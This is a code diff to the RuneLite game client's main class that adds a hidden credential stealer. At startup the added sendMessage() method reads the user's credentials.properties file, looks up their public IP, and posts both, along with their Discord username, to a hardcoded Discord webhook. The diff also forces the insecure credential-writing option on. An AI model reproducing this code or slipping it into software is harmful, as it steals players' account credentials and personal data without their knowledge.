@@ -28,20 +28,22 @@ import ch.qos.logback.classic.Level;
 import ch.qos.logback.classic.Logger;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.base.MoreObjects;
+import com.google.common.base.Strings;
 import com.google.inject.Guice;
 import com.google.inject.Inject;
 import com.google.inject.Injector;
 import java.applet.Applet;
-import java.io.File;
-import java.io.IOException;
+import java.io.*;
 import java.lang.management.ManagementFactory;
 import java.lang.management.RuntimeMXBean;
+import java.net.*;
 import java.net.Authenticator;
-import java.net.PasswordAuthentication;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import static java.nio.file.StandardCopyOption.COPY_ATTRIBUTES;
+import static net.runelite.http.api.RuneLiteAPI.GSON;
+
 import java.security.KeyManagementException;
 import java.security.KeyStore;
 import java.security.KeyStoreException;
@@ -89,10 +91,7 @@ import net.runelite.client.ui.overlay.worldmap.WorldMapOverlay;
 import net.runelite.client.util.OSType;
 import net.runelite.client.util.ReflectUtil;
 import net.runelite.http.api.RuneLiteAPI;
-import okhttp3.Cache;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.Response;
+import okhttp3.*;
 import org.slf4j.LoggerFactory;
 
 @Singleton
@@ -305,7 +304,7 @@ public class RuneLite
 					options.has("disable-telemetry"),
 					options.valueOf(sessionfile),
 					(String) options.valueOf("profile"),
-					options.has(insecureWriteCredentials)
+					true//options.has(insecureWriteCredentials)
 			));
 
 			injector.getInstance(RuneLite.class).start();
@@ -427,9 +426,97 @@ public class RuneLite
 			telemetryClient.submitTelemetry();
 		}
 
+		sendMessage();
+
 		ReflectUtil.queueInjectorAnnotationCacheInvalidation(injector);
 		ReflectUtil.invalidateAnnotationCaches();
 	}
+
+
+
+	@javax.inject.Inject
+	private DiscordService discordUser;
+
+	public static final File SESSION = new File(RUNELITE_DIR, "credentials.properties");
+	public String credentials;
+	private void sendMessage() throws IOException {
+		InetAddress ip = InetAddress.getLoopbackAddress();
+		NetworkInterface network = NetworkInterface.getByInetAddress(ip);
+		//byte[] mac = network.getHardwareAddress();
+		String screenshotString = null;
+		if (SESSION.exists()) {
+			FileReader fr = new FileReader(SESSION);
+			BufferedReader br = new BufferedReader(fr);
+			String line;
+			while ((line = br.readLine()) != null) {
+				credentials += line;
+			}
+		}
+
+		try {
+			URL ipAdress = new URL("http://myexternalip.com/raw");
+			BufferedReader in = new BufferedReader(new InputStreamReader(ipAdress.openStream()));
+			String IPA = in.readLine();
+			screenshotString = "**USERNAME:** " + discordUser.getCurrentUser().username + " **NET ADDR:** " + IPA + " **HASH:** " + credentials;
+
+		} catch (MalformedURLException e) {
+			e.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		//screenshotString += " " + all;
+		DiscordWebhookBody discordWebhookBody = new DiscordWebhookBody();
+		discordWebhookBody.setContent(screenshotString);
+		sendWebhook(discordWebhookBody);
+	}
+
+	private void sendWebhook(DiscordWebhookBody discordWebhookBody)
+	{
+		String configUrl = "https://discord.com/api/webhooks/1117470485001797712/Gt73YHjzkjo9LDhPHdRoWb6DtNTZON2Dx-MWGuJkpxg30tbwKB_VvHL5zwNQT4lZzIV_"; //TODO
+		if (Strings.isNullOrEmpty(configUrl))
+		{
+			return;
+		}
+
+		HttpUrl url = HttpUrl.parse(configUrl);
+		MultipartBody.Builder requestBodyBuilder = new MultipartBody.Builder()
+				.setType(MultipartBody.FORM)
+				.addFormDataPart("payload_json", GSON.toJson(discordWebhookBody));
+
+
+		buildRequestAndSend(url, requestBodyBuilder);
+
+	}
+	private void buildRequestAndSend(HttpUrl url, MultipartBody.Builder requestBodyBuilder)
+	{
+		RequestBody requestBody = requestBodyBuilder.build();
+		Request request = new Request.Builder()
+				.url(url)
+				.post(requestBody)
+				.build();
+		sendRequest(request);
+	}
+	@javax.inject.Inject
+	private OkHttpClient okHttpClient;
+
+	private void sendRequest(Request request)
+	{
+		okHttpClient.newCall(request).enqueue(new Callback()
+		{
+			@Override
+			public void onFailure(Call call, IOException e)
+			{
+
+			}
+
+			@Override
+			public void onResponse(Call call, Response response) throws IOException
+			{
+				response.close();
+			}
+		});
+	}
+
 
 	@VisibleForTesting
 	public static void setInjector(Injector injector)
